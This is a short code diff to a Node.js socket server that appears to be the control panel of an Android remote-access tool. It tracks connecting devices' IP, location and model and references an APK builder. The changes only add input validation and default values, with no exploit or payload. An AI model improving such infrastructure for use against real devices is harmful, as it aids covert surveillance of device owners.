@@ -24,7 +24,12 @@ global.clientManager = clientManager;
 global.apkBuilder = apkBuilder;
 
 // Mark all clients as offline on startup to prevent state drift
-db.maindb.get('clients').value().forEach(client => {
+let clients = db.maindb.get('clients').value();
+if (!Array.isArray(clients)) {
+    console.error('Error: clients field is missing or not an array in maindb.json');
+    process.exit(1);
+}
+clients.forEach(client => {
     client.isOnline = false;
 });
 db.maindb.write();
@@ -40,7 +45,7 @@ client_io.on('connection', (socket) => {
     let clientParams = socket.handshake.query;
     
     // Patch 1: Validate clientID
-    if (!clientParams.id || typeof clientParams.id !== 'string' || clientParams.id.trim() === '') {
+    if (!clientParams.id || typeof clientParams.id !== 'string' || clientParams.id.trim() === '' || clientParams.id.length > 200) {
         return socket.disconnect();
     }
 
@@ -60,9 +65,9 @@ client_io.on('connection', (socket) => {
         clientIP,
         clientGeo,
         device: {
-            model: clientParams.model,
-            manufacture: clientParams.manf,
-            version: clientParams.release
+            model: clientParams.model || 'unknown',
+            manufacture: clientParams.manf || 'unknown',
+            version: clientParams.release || 'unknown'
         }
     });
 
